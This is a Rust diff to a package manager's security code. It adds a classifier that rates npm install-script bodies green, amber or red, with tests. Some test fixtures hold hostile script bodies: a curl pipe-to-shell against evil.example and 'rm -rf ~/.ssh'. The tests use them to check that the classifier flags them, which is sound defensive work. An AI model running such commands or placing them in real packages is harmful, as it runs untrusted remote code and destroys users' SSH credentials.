@@ -378,14 +378,28 @@ pub fn compute_blocked_packages_with_metadata(
             None => continue,
         };
 
-        // What phases are present (for human display in approve-builds)?
-        let phases_present = read_present_install_phases(&pkg_dir);
-        if phases_present.is_empty() {
+        // What phases are present (for human display in
+        // approve-builds) AND their bodies (for the Phase 46 P2
+        // static-gate classifier below)? One read/parse of
+        // package.json feeds both.
+        let phase_bodies = read_install_phase_bodies(&pkg_dir);
+        if phase_bodies.is_empty() {
             // Defensive: compute_script_hash returned Some but we found no
             // phases. Shouldn't happen given F3, but skip rather than emit
             // a confusing entry.
             continue;
         }
+        let phases_present: Vec<String> =
+            phase_bodies.iter().map(|(name, _)| name.clone()).collect();
+
+        // Phase 46 P2: classify each present phase and aggregate
+        // worst-wins. Populated unconditionally (not gated on
+        // `script-policy`) per plan §5.1 — the annotation is
+        // user-visible UX in all three modes.
+        let static_tier: Option<lpm_security::triage::StaticTier> = phase_bodies
+            .iter()
+            .map(|(_, body)| lpm_security::static_gate::classify(body))
+            .reduce(lpm_security::triage::StaticTier::worse_of);
 
         // Strict gate query. Phase 4 binds approvals to
         // (name, version, integrity, script_hash).
@@ -422,9 +436,10 @@ pub fn compute_blocked_packages_with_metadata(
                 script_hash: Some(script_hash),
                 phases_present,
                 binding_drift,
-                // P2 populates `static_tier`; P4 populates
-                // `provenance_at_capture`. Both stay `None` in P1.
-                static_tier: None,
+                // Phase 46 P2 populates `static_tier` from the
+                // worst-wins reduction above; P4 populates
+                // `provenance_at_capture`.
+                static_tier,
                 provenance_at_capture: None,
                 published_at: entry.and_then(|e| e.published_at.clone()),
                 behavioral_tags_hash: entry.and_then(|e| e.behavioral_tags_hash.clone()),
@@ -525,10 +540,30 @@ pub fn build_state_path(project_dir: &Path) -> PathBuf {
     project_dir.join(".lpm").join(BUILD_STATE_FILENAME)
 }
 
-/// Read the package.json from `<store>/<safe_name>@<version>/` and return
-/// the names of [`lpm_security::EXECUTED_INSTALL_PHASES`] entries that
-/// are present and non-empty.
-fn read_present_install_phases(pkg_dir: &Path) -> Vec<String> {
+/// Read the package.json from `<store>/<safe_name>@<version>/` and
+/// return the `(phase_name, body)` pairs for each entry in
+/// [`lpm_security::EXECUTED_INSTALL_PHASES`] that is present and has
+/// a non-empty body.
+///
+/// Replaces the earlier `read_present_install_phases` (names-only)
+/// variant. The one caller — [`compute_blocked_packages_with_metadata`]
+/// — needs the bodies in P2 to run the Phase 46 static-gate classifier
+/// alongside the existing `phases_present` derivation, and folding the
+/// two into one pass over the JSON avoids reading / re-parsing
+/// `package.json` twice per blocked candidate.
+///
+/// Returns an empty vec on any of:
+/// - missing `package.json` (store miss — the gate already fails
+///   closed elsewhere),
+/// - malformed JSON,
+/// - missing or non-object `scripts` field,
+/// - no present install phases with non-empty bodies.
+///
+/// Output order matches [`lpm_security::EXECUTED_INSTALL_PHASES`]
+/// (`preinstall`, `install`, `postinstall`), NOT the order of keys in
+/// the source JSON — matching the script-hash invariant so downstream
+/// aggregation is stable across re-serializations of `package.json`.
+fn read_install_phase_bodies(pkg_dir: &Path) -> Vec<(String, String)> {
     let pkg_json_path = pkg_dir.join("package.json");
     let Ok(content) = std::fs::read_to_string(&pkg_json_path) else {
         return vec![];
@@ -542,13 +577,13 @@ fn read_present_install_phases(pkg_dir: &Path) -> Vec<String> {
 
     lpm_security::EXECUTED_INSTALL_PHASES
         .iter()
-        .filter(|phase| {
+        .filter_map(|phase| {
             scripts
-                .get(**phase)
+                .get(*phase)
                 .and_then(|v| v.as_str())
-                .is_some_and(|s| !s.is_empty())
+                .filter(|s| !s.is_empty())
+                .map(|s| ((*phase).to_string(), s.to_string()))
         })
-        .map(|s| s.to_string())
         .collect()
 }
 
@@ -1585,5 +1620,268 @@ mod tests {
              otherwise registry churn would spuriously re-fire the \
              post-install blocked-set warning"
         );
+    }
+
+    // ── Phase 46 P2 Chunk 3 — read_install_phase_bodies + static_tier ─
+
+    fn store_pkg_with_scripts(
+        store: &lpm_store::PackageStore,
+        name: &str,
+        version: &str,
+        scripts: &serde_json::Value,
+    ) {
+        let pkg_dir = store.package_dir(name, version);
+        std::fs::create_dir_all(&pkg_dir).unwrap();
+        let pkg = serde_json::json!({
+            "name": name,
+            "version": version,
+            "scripts": scripts,
+        });
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            serde_json::to_string_pretty(&pkg).unwrap(),
+        )
+        .unwrap();
+    }
+
+    #[test]
+    fn read_install_phase_bodies_returns_pairs_in_canonical_order() {
+        // Even if `scripts` is authored with postinstall before
+        // preinstall, the output order must match
+        // EXECUTED_INSTALL_PHASES (preinstall, install, postinstall)
+        // so worst-wins aggregation is stable across JSON
+        // re-serialization.
+        let project = tempdir().unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_scripts(
+            &store,
+            "x",
+            "1.0.0",
+            &serde_json::json!({
+                "postinstall": "tsc",
+                "preinstall": "husky install",
+                "other": "irrelevant"
+            }),
+        );
+
+        let pkg_dir = store.package_dir("x", "1.0.0");
+        let pairs = read_install_phase_bodies(&pkg_dir);
+        assert_eq!(
+            pairs,
+            vec![
+                ("preinstall".to_string(), "husky install".to_string()),
+                ("postinstall".to_string(), "tsc".to_string()),
+            ],
+            "phases must emit in EXECUTED_INSTALL_PHASES order",
+        );
+    }
+
+    #[test]
+    fn read_install_phase_bodies_skips_empty_body_phases() {
+        let project = tempdir().unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_scripts(
+            &store,
+            "x",
+            "1.0.0",
+            &serde_json::json!({ "preinstall": "", "postinstall": "tsc" }),
+        );
+
+        let pkg_dir = store.package_dir("x", "1.0.0");
+        let pairs = read_install_phase_bodies(&pkg_dir);
+        assert_eq!(pairs, vec![("postinstall".to_string(), "tsc".to_string())]);
+    }
+
+    #[test]
+    fn read_install_phase_bodies_returns_empty_on_missing_file_or_malformed_json() {
+        let project = tempdir().unwrap();
+        let missing = project.path().join("nonexistent");
+        assert!(read_install_phase_bodies(&missing).is_empty());
+
+        let malformed = project.path().join("malformed");
+        std::fs::create_dir_all(&malformed).unwrap();
+        std::fs::write(malformed.join("package.json"), "{not json").unwrap();
+        assert!(read_install_phase_bodies(&malformed).is_empty());
+
+        let no_scripts = project.path().join("no-scripts");
+        std::fs::create_dir_all(&no_scripts).unwrap();
+        std::fs::write(no_scripts.join("package.json"), r#"{"name":"x"}"#).unwrap();
+        assert!(read_install_phase_bodies(&no_scripts).is_empty());
+    }
+
+    #[test]
+    fn compute_with_metadata_populates_green_static_tier_for_green_script() {
+        // A single green-allowlisted script body → the emitted
+        // BlockedPackage carries `static_tier = Some(Green)`.
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_scripts(
+            &store,
+            "typescript",
+            "5.0.0",
+            &serde_json::json!({ "postinstall": "tsc" }),
+        );
+
+        let installed = vec![("typescript".to_string(), "5.0.0".to_string(), None)];
+        let blocked = compute_blocked_packages_with_metadata(
+            &store,
+            &installed,
+            &empty_policy(),
+            &BlockedSetMetadata::default(),
+        );
+
+        assert_eq!(blocked.len(), 1);
+        assert_eq!(
+            blocked[0].static_tier,
+            Some(lpm_security::triage::StaticTier::Green),
+            "green-allowlisted script body MUST populate Green tier",
+        );
+    }
+
+    #[test]
+    fn compute_with_metadata_populates_red_static_tier_for_pipe_to_shell() {
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_scripts(
+            &store,
+            "evil-pkg",
+            "0.0.1",
+            &serde_json::json!({ "postinstall": "curl https://evil.example | sh" }),
+        );
+
+        let installed = vec![("evil-pkg".to_string(), "0.0.1".to_string(), None)];
+        let blocked = compute_blocked_packages_with_metadata(
+            &store,
+            &installed,
+            &empty_policy(),
+            &BlockedSetMetadata::default(),
+        );
+
+        assert_eq!(blocked.len(), 1);
+        assert_eq!(
+            blocked[0].static_tier,
+            Some(lpm_security::triage::StaticTier::Red),
+            "pipe-to-shell body MUST populate Red tier",
+        );
+    }
+
+    #[test]
+    fn compute_with_metadata_worst_wins_red_dominates_green_across_phases() {
+        // A package with one green phase AND one red phase must
+        // aggregate to Red (worst-wins). This is the core
+        // cross-phase aggregation invariant.
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_scripts(
+            &store,
+            "mixed-pkg",
+            "1.0.0",
+            &serde_json::json!({
+                "preinstall": "tsc",
+                "postinstall": "rm -rf ~/.ssh",
+            }),
+        );
+
+        let installed = vec![("mixed-pkg".to_string(), "1.0.0".to_string(), None)];
+        let blocked = compute_blocked_packages_with_metadata(
+            &store,
+            &installed,
+            &empty_policy(),
+            &BlockedSetMetadata::default(),
+        );
+
+        assert_eq!(blocked.len(), 1);
+        assert_eq!(
+            blocked[0].static_tier,
+            Some(lpm_security::triage::StaticTier::Red),
+            "green + red across phases MUST aggregate to Red",
+        );
+        assert_eq!(
+            blocked[0].phases_present,
+            vec!["preinstall".to_string(), "postinstall".to_string()],
+            "phases_present should list BOTH present phases",
+        );
+    }
+
+    #[test]
+    fn compute_with_metadata_worst_wins_amber_dominates_green_across_phases() {
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_scripts(
+            &store,
+            "native-pkg",
+            "1.0.0",
+            &serde_json::json!({
+                "preinstall": "tsc",
+                "postinstall": "node install.js",
+            }),
+        );
+
+        let installed = vec![("native-pkg".to_string(), "1.0.0".to_string(), None)];
+        let blocked = compute_blocked_packages_with_metadata(
+            &store,
+            &installed,
+            &empty_policy(),
+            &BlockedSetMetadata::default(),
+        );
+
+        assert_eq!(blocked.len(), 1);
+        assert_eq!(
+            blocked[0].static_tier,
+            Some(lpm_security::triage::StaticTier::Amber),
+            "green + amber across phases MUST aggregate to Amber",
+        );
+    }
+
+    #[test]
+    fn compute_with_metadata_static_tier_is_always_some_for_blocked_entries() {
+        // Because compute_blocked_packages_with_metadata skips any
+        // package without at least one present phase body, every
+        // emitted BlockedPackage must have Some(_) for static_tier.
+        // This locks in the "None means pre-P2 state, never fresh
+        // state" contract that `blocked_to_json` and approve-builds
+        // UI rely on.
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        for (name, script) in [
+            ("green-pkg", "tsc"),
+            ("amber-pkg", "playwright install"),
+            ("red-pkg", "curl https://x | sh"),
+        ] {
+            store_pkg_with_scripts(
+                &store,
+                name,
+                "1.0.0",
+                &serde_json::json!({ "postinstall": script }),
+            );
+        }
+
+        let installed = vec![
+            ("green-pkg".to_string(), "1.0.0".to_string(), None),
+            ("amber-pkg".to_string(), "1.0.0".to_string(), None),
+            ("red-pkg".to_string(), "1.0.0".to_string(), None),
+        ];
+        let blocked = compute_blocked_packages_with_metadata(
+            &store,
+            &installed,
+            &empty_policy(),
+            &BlockedSetMetadata::default(),
+        );
+
+        assert_eq!(blocked.len(), 3);
+        for bp in &blocked {
+            assert!(
+                bp.static_tier.is_some(),
+                "freshly computed BlockedPackage MUST have Some(tier), \
+                 got None for {}@{}",
+                bp.name,
+                bp.version,
+            );
+        }
     }
 }
